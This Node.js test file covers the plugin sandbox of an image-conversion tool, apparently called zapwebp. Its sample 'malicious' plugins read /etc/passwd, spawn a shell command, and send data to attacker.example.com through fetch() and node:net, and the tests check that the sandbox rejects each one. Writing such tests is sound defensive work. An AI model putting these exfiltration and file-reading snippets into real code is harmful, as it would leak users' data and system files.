'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const {
  validatePluginPermissions,
  runInSandbox,
  executeInWorker,
  sandboxedTransform,
  sandboxedFormatHandler,
  createMockRawImage,
} = require('../src');

test('Sandbox: blocks malicious plugin attempting to access node:fs and read files', async () => {
  const maliciousTransform = sandboxedTransform({
    name: 'evil-exfiltrator',
    async apply(image) {
      // Attempt to access host filesystem
      const fs = require('node:fs');
      return fs.readFileSync('/etc/passwd');
    },
  });

  const image = createMockRawImage(10, 10);

  await assert.rejects(
    async () => {
      await maliciousTransform.apply(image);
    },
    (err) => {
      assert.equal(err.code, 'E_PLUGIN_SANDBOX_VIOLATION');
      assert.match(err.message, /attempted unauthorized access to restricted module "node:fs"/);
      assert.match(err.message, /Community plugins receive bytes and return bytes only/);
      assert.ok(err.docs.includes('e_plugin_sandbox_violation'));
      assert.ok(err.fix.includes('Remove direct filesystem imports'));
      return true;
    }
  );
});

test('Sandbox: blocks malicious plugin attempting to spawn child processes', async () => {
  const maliciousTransform = sandboxedTransform({
    name: 'evil-shell',
    async apply(image) {
      const cp = require('child_process');
      return cp.execSync('whoami');
    },
  });

  const image = createMockRawImage(10, 10);

  await assert.rejects(
    async () => {
      await maliciousTransform.apply(image);
    },
    (err) => {
      assert.equal(err.code, 'E_PLUGIN_SANDBOX_VIOLATION');
      assert.match(err.message, /restricted module "child_process"/);
      return true;
    }
  );
});

test('Sandbox: blocks unauthorized network exfiltration via fetch without permission', async () => {
  const phoneHomeTransform = sandboxedTransform({
    name: 'evil-telemetry',
    async apply(image) {
      return fetch('https://attacker.example.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({ leaked: 'data' }),
      });
    },
  });

  const image = createMockRawImage(10, 10);

  await assert.rejects(
    async () => {
      await phoneHomeTransform.apply(image);
    },
    (err) => {
      assert.equal(err.code, 'E_PLUGIN_SANDBOX_VIOLATION');
      assert.match(err.message, /unauthorized network access via fetch\(\)/);
      assert.ok(err.fix.includes('zapwebp.permissions: ["network"]'));
      return true;
    }
  );
});

test('Sandbox: blocks unauthorized network exfiltration via node:net and node:http without permission', async () => {
  const maliciousNet = sandboxedTransform({
    name: 'evil-net',
    async apply(image) {
      const net = require('node:net');
      return net.connect(80, 'attacker.example.com');
    },
  });

  const image = createMockRawImage(10, 10);

  await assert.rejects(
    async () => {
      await maliciousNet.apply(image);
    },
    (err) => {
      assert.equal(err.code, 'E_PLUGIN_SANDBOX_VIOLATION');
      assert.match(err.message, /unauthorized network access via "node:net"/);
      return true;
    }
  );
});

test('Sandbox: legitimate community pixel transform executes successfully', async () => {
  const legitimateGrayscale = sandboxedTransform({
    name: 'community-grayscale',
    async apply(image) {
      // Inverts red and blue channels pure in-memory
      const d = image.data;
      for (let i = 0; i < d.length; i += 4) {
        const avg = Math.round((d[i] + d[i + 1] + d[i + 2]) / 3);
        d[i] = avg;
        d[i + 1] = avg;
        d[i + 2] = avg;
      }
      return image;
    },
  });

  const inputImage = createMockRawImage(4, 4);
  inputImage.data[0] = 255;
  inputImage.data[1] = 0;
  inputImage.data[2] = 0;
  inputImage.data[3] = 255;

  const result = await legitimateGrayscale.apply(inputImage);
  assert.equal(result.width, 4);
  assert.equal(result.height, 4);
  assert.equal(result.data[0], 85); // 255/3
});

test('Sandbox: permissions validation allows network when declared and consented', async () => {
  const storageManifest = {
    name: 'zapwebp-storage-s3',
    version: '1.0.0',
    zapwebp: {
      permissions: ['network'],
    },
  };

  // Rejects when consent not provided
  await assert.rejects(
    async () => {
      await validatePluginPermissions(storageManifest, { allowNetwork: false });
    },
    (err) => {
      assert.equal(err.code, 'E_PLUGIN_SANDBOX_VIOLATION');
      assert.match(err.message, /requests network access, but permission was not granted/);
      assert.ok(err.fix.includes('--allow-network-plugin'));
      return true;
    }
  );

  // Succeeds when consent granted via prompt
  const consented = await validatePluginPermissions(storageManifest, {
    promptConsent: async (plugin, perms) => perms.includes('network'),
  });
  assert.equal(consented.allowed, true);
  assert.deepEqual(consented.permissions, ['network']);

  // Succeeds when allowNetwork flag is true
  const allowed = await validatePluginPermissions(storageManifest, { allowNetwork: true });
  assert.equal(allowed.allowed, true);
});

test('Sandbox: sandboxedFormatHandler enforces valid byte inputs and output contracts', async () => {
  const safeHandler = sandboxedFormatHandler({
    name: 'mock-format',
    async decode(bytes) {
      return createMockRawImage(8, 8);
    },
    async encode(image) {
      return Buffer.from([0x01, 0x02, 0x03]);
    },
  });

  // Rejects empty decode input
  await assert.rejects(
    async () => {
      await safeHandler.decode(Buffer.alloc(0));
    },
    (err) => {
      assert.equal(err.code, 'E_EMPTY_FILE');
      return true;
    }
  );

  // Decodes valid bytes
  const decoded = await safeHandler.decode(Buffer.from([0xAA, 0xBB, 0xCC, 0xDD]));
  assert.equal(decoded.width, 8);
  assert.equal(decoded.height, 8);

  // Encodes valid image
  const encoded = await safeHandler.encode(decoded);
  assert.equal(encoded.length, 3);
});
